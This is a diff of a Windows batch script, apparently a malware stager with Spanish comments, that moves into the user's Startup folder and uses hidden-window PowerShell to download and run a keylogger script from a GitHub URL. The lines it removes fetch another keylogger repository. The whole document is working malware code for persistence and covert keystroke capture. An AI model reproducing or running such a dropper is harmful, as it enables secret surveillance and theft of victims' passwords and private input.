@@ -11,14 +11,11 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd  %STARTUP% 
 
 @REM Ejecutar payloads al inicio.
-(
-	echo powershell -c "Invoke-WebRequest -Uri 'https://codeload.github.com/PrettyBoyCosmo/DucKey-Logger/zip/refs/heads/main' -OutFile 'fuckyou.zip'"
-) > stage2.cmd
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/Recursos/Keylogger/p.ps1?token=GHSAT0AAAAAABY5KKPPTQJINMCGXR4UI37CYZHOMXA -OutFile p.ps1"
 
 @REM corriendo el payload
 @REM powershell Start-Process CMD.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
-powershell ./stage2.cmd
- pause 
+powershell ./wget.cmd
 
 @REM cd hacia la locacion inicial
 cd %INITIALPATH%
